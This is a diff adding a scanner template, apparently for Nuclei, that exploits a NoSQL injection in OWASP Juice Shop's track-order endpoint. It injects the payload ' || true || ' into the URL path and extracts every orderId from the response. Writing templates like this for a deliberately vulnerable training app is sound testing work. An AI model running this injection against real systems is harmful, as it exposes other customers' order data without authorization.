@@ -1,0 +1,25 @@
+id: juice-shop-nosql-exfiltration
+
+info:
+  name: NoSQL Exfiltration
+  author: yelaco
+  severity: critical
+  tags: juice-shop,nosqli,orders
+  description: All your orders are belong to us! Even the ones which don’t!
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/rest/track-order/' || true || '"
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "orderId"
+
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "\"orderId\"\\s*:\\s*\"[^\"]+\""
